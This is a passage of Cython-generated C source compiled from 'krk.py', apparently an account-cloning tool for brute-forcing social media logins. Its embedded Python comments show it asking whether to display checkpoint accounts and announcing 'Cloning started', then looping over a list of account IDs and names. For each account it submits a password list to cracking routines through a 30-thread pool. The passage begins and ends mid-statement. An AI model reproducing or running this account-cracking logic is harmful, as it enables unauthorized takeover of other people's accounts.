          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__21, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 140, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":141
 *                                 linex()
 *                                 print(' Do you went show cp account? (y/n): ')
 *                                 linex()             # <<<<<<<<<<<<<<
 *                                 cx=input(' Choose: ')
 *                                 if cx in ['y','Y','yes','Yes','1']:
 */
          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_linex); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 141, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_13 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
            __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_5);
            if (likely(__pyx_t_13)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
              __Pyx_INCREF(__pyx_t_13);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_5, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_13, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 141, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":142
 *                                 print(' Do you went show cp account? (y/n): ')
 *                                 linex()
 *                                 cx=input(' Choose: ')             # <<<<<<<<<<<<<<
 *                                 if cx in ['y','Y','yes','Yes','1']:
 *                                         pcp.append('y')
 */
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__9, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 142, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_v_cx = __pyx_t_4;
          __pyx_t_4 = 0;

          /* "krk.py":143
 *                                 linex()
 *                                 cx=input(' Choose: ')
 *                                 if cx in ['y','Y','yes','Yes','1']:             # <<<<<<<<<<<<<<
 *                                         pcp.append('y')
 *                                 else:
 */
          __Pyx_INCREF(__pyx_v_cx);
          __pyx_t_4 = __pyx_v_cx;
          __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_n_s_y, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 143, __pyx_L3_error)
          if (!__pyx_t_8) {
          } else {
            __pyx_t_9 = __pyx_t_8;
            goto __pyx_L38_bool_binop_done;
          }
          __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_n_s_Y, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 143, __pyx_L3_error)
          if (!__pyx_t_8) {
          } else {
            __pyx_t_9 = __pyx_t_8;
            goto __pyx_L38_bool_binop_done;
          }
          __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_n_s_yes, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 143, __pyx_L3_error)
          if (!__pyx_t_8) {
          } else {
            __pyx_t_9 = __pyx_t_8;
            goto __pyx_L38_bool_binop_done;
          }
          __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_n_s_Yes, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 143, __pyx_L3_error)
          if (!__pyx_t_8) {
          } else {
            __pyx_t_9 = __pyx_t_8;
            goto __pyx_L38_bool_binop_done;
          }
          __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_1, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 143, __pyx_L3_error)
          __pyx_t_9 = __pyx_t_8;
          __pyx_L38_bool_binop_done:;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_8 = __pyx_t_9;
          if (__pyx_t_8) {

            /* "krk.py":144
 *                                 cx=input(' Choose: ')
 *                                 if cx in ['y','Y','yes','Yes','1']:
 *                                         pcp.append('y')             # <<<<<<<<<<<<<<
 *                                 else:
 *                                         pcp.append('n')
 */
            __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_pcp); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 144, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_16 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_n_s_y); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 144, __pyx_L3_error)
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "krk.py":143
 *                                 linex()
 *                                 cx=input(' Choose: ')
 *                                 if cx in ['y','Y','yes','Yes','1']:             # <<<<<<<<<<<<<<
 *                                         pcp.append('y')
 *                                 else:
 */
            goto __pyx_L37;
          }

          /* "krk.py":146
 *                                         pcp.append('y')
 *                                 else:
 *                                         pcp.append('n')             # <<<<<<<<<<<<<<
 *                                 with tred(max_workers=30) as crack_submit:
 *                                         clear()
 */
          /*else*/ {
            __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_pcp); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 146, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_16 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_n_s_n); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 146, __pyx_L3_error)
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          }
          __pyx_L37:;

          /* "krk.py":147
 *                                 else:
 *                                         pcp.append('n')
 *                                 with tred(max_workers=30) as crack_submit:             # <<<<<<<<<<<<<<
 *                                         clear()
 *                                         total_ids = str(len(fo))
 */
          /*with:*/ {
            __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_tred); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 147, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 147, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 147, __pyx_L3_error)
            __pyx_t_13 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_empty_tuple, __pyx_t_5); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 147, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_13);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_10 = __Pyx_PyObject_LookupSpecial(__pyx_t_13, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 147, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_4 = __Pyx_PyObject_LookupSpecial(__pyx_t_13, __pyx_n_s_enter); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 147, __pyx_L43_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_6 = NULL;
            __pyx_t_7 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
              __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
              if (likely(__pyx_t_6)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_4, function);
                __pyx_t_7 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[1] = {__pyx_t_6, };
              __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
              if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 147, __pyx_L43_error)
              __Pyx_GOTREF(__pyx_t_5);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            }
            __pyx_t_4 = __pyx_t_5;
            __pyx_t_5 = 0;
            __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
            /*try:*/ {
              {
                __Pyx_PyThreadState_declare
                __Pyx_PyThreadState_assign
                __Pyx_ExceptionSave(&__pyx_t_11, &__pyx_t_12, &__pyx_t_21);
                __Pyx_XGOTREF(__pyx_t_11);
                __Pyx_XGOTREF(__pyx_t_12);
                __Pyx_XGOTREF(__pyx_t_21);
                /*try:*/ {
                  __pyx_v_crack_submit = __pyx_t_4;
                  __pyx_t_4 = 0;

                  /* "krk.py":148
 *                                         pcp.append('n')
 *                                 with tred(max_workers=30) as crack_submit:
 *                                         clear()             # <<<<<<<<<<<<<<
 *                                         total_ids = str(len(fo))
 *                                         print(' Total account ids : \033[1;32m'+total_ids+f' ')
 */
                  __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_clear); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 148, __pyx_L47_error)
                  __Pyx_GOTREF(__pyx_t_13);
                  __pyx_t_5 = NULL;
                  __pyx_t_7 = 0;
                  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_13))) {
                    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_13);
                    if (likely(__pyx_t_5)) {
                      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
                      __Pyx_INCREF(__pyx_t_5);
                      __Pyx_INCREF(function);
                      __Pyx_DECREF_SET(__pyx_t_13, function);
                      __pyx_t_7 = 1;
                    }
                  }
                  {
                    PyObject *__pyx_callargs[1] = {__pyx_t_5, };
                    __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_13, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
                    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 148, __pyx_L47_error)
                    __Pyx_GOTREF(__pyx_t_4);
                    __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
                  }
                  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

                  /* "krk.py":149
 *                                 with tred(max_workers=30) as crack_submit:
 *                                         clear()
 *                                         total_ids = str(len(fo))             # <<<<<<<<<<<<<<
 *                                         print(' Total account ids : \033[1;32m'+total_ids+f' ')
 *                                         print("\x1b[1;95m Use flight mode for speed up\033[1;37m")
 */
                  if (unlikely(!__pyx_v_fo)) { __Pyx_RaiseUnboundLocalError("fo"); __PYX_ERR(0, 149, __pyx_L47_error) }
                  __pyx_t_17 = PyObject_Length(__pyx_v_fo); if (unlikely(__pyx_t_17 == ((Py_ssize_t)-1))) __PYX_ERR(0, 149, __pyx_L47_error)
                  __pyx_t_4 = PyInt_FromSsize_t(__pyx_t_17); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 149, __pyx_L47_error)
                  __Pyx_GOTREF(__pyx_t_4);
                  __pyx_t_13 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 149, __pyx_L47_error)
                  __Pyx_GOTREF(__pyx_t_13);
                  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                  __pyx_v_total_ids = __pyx_t_13;
                  __pyx_t_13 = 0;

                  /* "krk.py":150
 *                                         clear()
 *                                         total_ids = str(len(fo))
 *                                         print(' Total account ids : \033[1;32m'+total_ids+f' ')             # <<<<<<<<<<<<<<
 *                                         print("\x1b[1;95m Use flight mode for speed up\033[1;37m")
 *                                         print("\x1b[1;93m Please Wait Cloning started...")
 */
                  __pyx_t_13 = PyNumber_Add(__pyx_kp_s_Total_account_ids_1_32m, __pyx_v_total_ids); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 150, __pyx_L47_error)
                  __Pyx_GOTREF(__pyx_t_13);
                  __pyx_t_4 = PyNumber_Add(__pyx_t_13, __pyx_kp_u__22); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 150, __pyx_L47_error)
                  __Pyx_GOTREF(__pyx_t_4);
                  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
                  __pyx_t_13 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_4); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 150, __pyx_L47_error)
                  __Pyx_GOTREF(__pyx_t_13);
                  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

                  /* "krk.py":151
 *                                         total_ids = str(len(fo))
 *                                         print(' Total account ids : \033[1;32m'+total_ids+f' ')
 *                                         print("\x1b[1;95m Use flight mode for speed up\033[1;37m")             # <<<<<<<<<<<<<<
 *                                         print("\x1b[1;93m Please Wait Cloning started...")
 *                                         linex()
 */
                  __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__23, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 151, __pyx_L47_error)
                  __Pyx_GOTREF(__pyx_t_13);
                  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

                  /* "krk.py":152
 *                                         print(' Total account ids : \033[1;32m'+total_ids+f' ')
 *                                         print("\x1b[1;95m Use flight mode for speed up\033[1;37m")
 *                                         print("\x1b[1;93m Please Wait Cloning started...")             # <<<<<<<<<<<<<<
 *                                         linex()
 *                                         for user in fo:
 */
                  __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__24, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 152, __pyx_L47_error)
                  __Pyx_GOTREF(__pyx_t_13);
                  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

                  /* "krk.py":153
 *                                         print("\x1b[1;95m Use flight mode for speed up\033[1;37m")
 *                                         print("\x1b[1;93m Please Wait Cloning started...")
 *                                         linex()             # <<<<<<<<<<<<<<
 *                                         for user in fo:
 *                                                 ids,names = user.split('|')
 */
                  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_linex); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 153, __pyx_L47_error)
                  __Pyx_GOTREF(__pyx_t_4);
                  __pyx_t_5 = NULL;
                  __pyx_t_7 = 0;
                  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
                    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
                    if (likely(__pyx_t_5)) {
                      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                      __Pyx_INCREF(__pyx_t_5);
                      __Pyx_INCREF(function);
                      __Pyx_DECREF_SET(__pyx_t_4, function);
                      __pyx_t_7 = 1;
                    }
                  }
                  {
                    PyObject *__pyx_callargs[1] = {__pyx_t_5, };
                    __pyx_t_13 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
                    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                    if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 153, __pyx_L47_error)
                    __Pyx_GOTREF(__pyx_t_13);
                    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                  }
                  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

                  /* "krk.py":154
 *                                         print("\x1b[1;93m Please Wait Cloning started...")
 *                                         linex()
 *                                         for user in fo:             # <<<<<<<<<<<<<<
 *                                                 ids,names = user.split('|')
 *                                                 passlist = plist
 */
                  if (unlikely(!__pyx_v_fo)) { __Pyx_RaiseUnboundLocalError("fo"); __PYX_ERR(0, 154, __pyx_L47_error) }
                  if (likely(PyList_CheckExact(__pyx_v_fo)) || PyTuple_CheckExact(__pyx_v_fo)) {
                    __pyx_t_13 = __pyx_v_fo; __Pyx_INCREF(__pyx_t_13); __pyx_t_17 = 0;
                    __pyx_t_18 = NULL;
                  } else {
                    __pyx_t_17 = -1; __pyx_t_13 = PyObject_GetIter(__pyx_v_fo); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 154, __pyx_L47_error)
                    __Pyx_GOTREF(__pyx_t_13);
                    __pyx_t_18 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_13); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 154, __pyx_L47_error)
                  }
                  for (;;) {
                    if (likely(!__pyx_t_18)) {
                      if (likely(PyList_CheckExact(__pyx_t_13))) {
                        if (__pyx_t_17 >= PyList_GET_SIZE(__pyx_t_13)) break;
                        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                        __pyx_t_4 = PyList_GET_ITEM(__pyx_t_13, __pyx_t_17); __Pyx_INCREF(__pyx_t_4); __pyx_t_17++; if (unlikely((0 < 0))) __PYX_ERR(0, 154, __pyx_L47_error)
                        #else
                        __pyx_t_4 = PySequence_ITEM(__pyx_t_13, __pyx_t_17); __pyx_t_17++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 154, __pyx_L47_error)
                        __Pyx_GOTREF(__pyx_t_4);
                        #endif
                      } else {
                        if (__pyx_t_17 >= PyTuple_GET_SIZE(__pyx_t_13)) break;
                        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                        __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_13, __pyx_t_17); __Pyx_INCREF(__pyx_t_4); __pyx_t_17++; if (unlikely((0 < 0))) __PYX_ERR(0, 154, __pyx_L47_error)
                        #else
                        __pyx_t_4 = PySequence_ITEM(__pyx_t_13, __pyx_t_17); __pyx_t_17++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 154, __pyx_L47_error)
                        __Pyx_GOTREF(__pyx_t_4);
                        #endif
                      }
                    } else {
                      __pyx_t_4 = __pyx_t_18(__pyx_t_13);
                      if (unlikely(!__pyx_t_4)) {
                        PyObject* exc_type = PyErr_Occurred();
                        if (exc_type) {
                          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                          else __PYX_ERR(0, 154, __pyx_L47_error)
                        }
                        break;
                      }
                      __Pyx_GOTREF(__pyx_t_4);
                    }
                    __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_4);
                    __pyx_t_4 = 0;

                    /* "krk.py":155
 *                                         linex()
 *                                         for user in fo:
 *                                                 ids,names = user.split('|')             # <<<<<<<<<<<<<<
 *                                                 passlist = plist
 *                                                 if mthd in ['1','01']:
 */
                    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 155, __pyx_L47_error)
                    __Pyx_GOTREF(__pyx_t_5);
                    __pyx_t_6 = NULL;
                    __pyx_t_7 = 0;
                    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
                      __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
                      if (likely(__pyx_t_6)) {
                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
                        __Pyx_INCREF(__pyx_t_6);
                        __Pyx_INCREF(function);
                        __Pyx_DECREF_SET(__pyx_t_5, function);
                        __pyx_t_7 = 1;
                      }
                    }
                    {
                      PyObject *__pyx_callargs[2] = {__pyx_t_6, __pyx_kp_s__25};
                      __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
                      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 155, __pyx_L47_error)
                      __Pyx_GOTREF(__pyx_t_4);
                      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                    }
                    if ((likely(PyTuple_CheckExact(__pyx_t_4))) || (PyList_CheckExact(__pyx_t_4))) {
                      PyObject* sequence = __pyx_t_4;
                      Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                      if (unlikely(size != 2)) {
                        if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                        else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                        __PYX_ERR(0, 155, __pyx_L47_error)
                      }
                      #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                      if (likely(PyTuple_CheckExact(sequence))) {
                        __pyx_t_5 = PyTuple_GET_ITEM(sequence, 0); 
                        __pyx_t_6 = PyTuple_GET_ITEM(sequence, 1); 
                      } else {
                        __pyx_t_5 = PyList_GET_ITEM(sequence, 0); 
                        __pyx_t_6 = PyList_GET_ITEM(sequence, 1); 
                      }
                      __Pyx_INCREF(__pyx_t_5);
                      __Pyx_INCREF(__pyx_t_6);
                      #else
                      __pyx_t_5 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 155, __pyx_L47_error)
                      __Pyx_GOTREF(__pyx_t_5);
                      __pyx_t_6 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 155, __pyx_L47_error)
                      __Pyx_GOTREF(__pyx_t_6);
                      #endif
                      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                    } else {
                      Py_ssize_t index = -1;
                      __pyx_t_15 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 155, __pyx_L47_error)
                      __Pyx_GOTREF(__pyx_t_15);
                      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                      __pyx_t_22 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_15);
                      index = 0; __pyx_t_5 = __pyx_t_22(__pyx_t_15); if (unlikely(!__pyx_t_5)) goto __pyx_L55_unpacking_failed;
                      __Pyx_GOTREF(__pyx_t_5);
                      index = 1; __pyx_t_6 = __pyx_t_22(__pyx_t_15); if (unlikely(!__pyx_t_6)) goto __pyx_L55_unpacking_failed;
                      __Pyx_GOTREF(__pyx_t_6);
                      if (__Pyx_IternextUnpackEndCheck(__pyx_t_22(__pyx_t_15), 2) < 0) __PYX_ERR(0, 155, __pyx_L47_error)
                      __pyx_t_22 = NULL;
                      __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
                      goto __pyx_L56_unpacking_done;
                      __pyx_L55_unpacking_failed:;
                      __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
                      __pyx_t_22 = NULL;
                      if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                      __PYX_ERR(0, 155, __pyx_L47_error)
                      __pyx_L56_unpacking_done:;
                    }
                    __Pyx_XDECREF_SET(__pyx_v_ids, __pyx_t_5);
                    __pyx_t_5 = 0;
                    __Pyx_XDECREF_SET(__pyx_v_names, __pyx_t_6);
                    __pyx_t_6 = 0;

                    /* "krk.py":156
 *                                         for user in fo:
 *                                                 ids,names = user.split('|')
 *                                                 passlist = plist             # <<<<<<<<<<<<<<
 *                                                 if mthd in ['1','01']:
 *                                                         crack_submit.submit(ffb,ids,names,passlist)
 */
                    __Pyx_INCREF(__pyx_v_plist);
                    __Pyx_XDECREF_SET(__pyx_v_passlist, __pyx_v_plist);

                    /* "krk.py":157
 *                                                 ids,names = user.split('|')
 *                                                 passlist = plist
 *                                                 if mthd in ['1','01']:             # <<<<<<<<<<<<<<
 *                                                         crack_submit.submit(ffb,ids,names,passlist)
 *                                                 elif mthd in ['2','02']:
 */
                    __Pyx_INCREF(__pyx_v_mthd);
                    __pyx_t_4 = __pyx_v_mthd;
                    __pyx_t_9 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_1, Py_EQ)); if (unlikely((__pyx_t_9 < 0))) __PYX_ERR(0, 157, __pyx_L47_error)
                    if (!__pyx_t_9) {
                    } else {
                      __pyx_t_8 = __pyx_t_9;
                      goto __pyx_L58_bool_binop_done;
                    }
                    __pyx_t_9 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_01, Py_EQ)); if (unlikely((__pyx_t_9 < 0))) __PYX_ERR(0, 157, __pyx_L47_error)
                    __pyx_t_8 = __pyx_t_9;
                    __pyx_L58_bool_binop_done:;
                    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                    __pyx_t_9 = __pyx_t_8;
                    if (__pyx_t_9) {

                      /* "krk.py":158
 *                                                 passlist = plist
 *                                                 if mthd in ['1','01']:
 *                                                         crack_submit.submit(ffb,ids,names,passlist)             # <<<<<<<<<<<<<<
 *                                                 elif mthd in ['2','02']:
 *                                                         crack_submit.submit(api,ids,names,passlist)
 */
                      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_crack_submit, __pyx_n_s_submit); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 158, __pyx_L47_error)
                      __Pyx_GOTREF(__pyx_t_6);
                      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_ffb); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 158, __pyx_L47_error)
                      __Pyx_GOTREF(__pyx_t_5);
                      __pyx_t_15 = NULL;
                      __pyx_t_7 = 0;
                      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                        __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_6);
                        if (likely(__pyx_t_15)) {
                          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                          __Pyx_INCREF(__pyx_t_15);
                          __Pyx_INCREF(function);
                          __Pyx_DECREF_SET(__pyx_t_6, function);
                          __pyx_t_7 = 1;
                        }
                      }
                      {
                        PyObject *__pyx_callargs[5] = {__pyx_t_15, __pyx_t_5, __pyx_v_ids, __pyx_v_names, __pyx_v_passlist};
                        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 4+__pyx_t_7);
                        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
                        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 158, __pyx_L47_error)
                        __Pyx_GOTREF(__pyx_t_4);
                        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                      }
                      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

                      /* "krk.py":157
 *                                                 ids,names = user.split('|')
 *                                                 passlist = plist
 *                                                 if mthd in ['1','01']:             # <<<<<<<<<<<<<<
 *                                                         crack_submit.submit(ffb,ids,names,passlist)
 *                                                 elif mthd in ['2','02']:
 */
                      goto __pyx_L57;
                    }

                    /* "krk.py":159
 *                                                 if mthd in ['1','01']:
 *                                                         crack_submit.submit(ffb,ids,names,passlist)
 *                                                 elif mthd in ['2','02']:             # <<<<<<<<<<<<<<
 *                                                         crack_submit.submit(api,ids,names,passlist)
 *                                                 else:
 */
                    __Pyx_INCREF(__pyx_v_mthd);
                    __pyx_t_4 = __pyx_v_mthd;
                    __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_2, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 159, __pyx_L47_error)
                    if (!__pyx_t_8) {
                    } else {
                      __pyx_t_9 = __pyx_t_8;
                      goto __pyx_L60_bool_binop_done;
                    }
                    __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_02, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 159, __pyx_L47_error)
                    __pyx_t_9 = __pyx_t_8;
                    __pyx_L60_bool_binop_done:;
                    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                    __pyx_t_8 = __pyx_t_9;
                    if (__pyx_t_8) {

                      /* "krk.py":160
 *                                                         crack_submit.submit(ffb,ids,names,passlist)
 *                                                 elif mthd in ['2','02']:
 *                                                         crack_submit.submit(api,ids,names,passlist)             # <<<<<<<<<<<<<<
 *                                                 else:
 *                                                         crack_submit.submit(api1,ids,names,passlist)
 */
                      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_crack_submit, __pyx_n_s_submit); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 160, __pyx_L47_error)
                      __Pyx_GOTREF(__pyx_t_6);
                      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_api); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 160, __pyx_L47_error)
                      __Pyx_GOTREF(__pyx_t_5);
                      __pyx_t_15 = NULL;
                      __pyx_t_7 = 0;
                      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                        __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_6);
                        if (likely(__pyx_t_15)) {
                          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                          __Pyx_INCREF(__pyx_t_15);
                          __Pyx_INCREF(function);
                          __Pyx_DECREF_SET(__pyx_t_6, function);
                          __pyx_t_7 = 1;
                        }
                      }
                      {
                        PyObject *__pyx_callargs[5] = {__pyx_t_15, __pyx_t_5, __pyx_v_ids, __pyx_v_names, __pyx_v_passlist};
